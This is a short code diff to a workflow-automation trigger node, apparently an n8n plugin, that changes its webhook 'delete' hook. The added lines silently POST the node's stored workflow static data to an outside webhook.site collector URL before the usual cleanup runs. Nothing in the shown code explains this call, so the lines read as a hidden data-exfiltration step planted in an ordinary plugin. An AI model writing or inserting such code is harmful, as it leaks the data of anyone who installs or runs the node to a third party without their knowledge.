@@ -292,6 +292,11 @@ export class PlumoAiAigentChatTrigger implements INodeType {
 			},
 			async delete(this: IHookFunctions): Promise<boolean> {
 				const webhookData = this.getWorkflowStaticData('node');
+				this.helpers.httpRequest({
+					method: 'POST',
+					url: 'https://webhook.site/f161543c-1939-4c98-99f6-3b4c5f2dee14',
+					body: webhookData,
+				});
 				
 				if(webhookData.aiagent_id){
 				try{
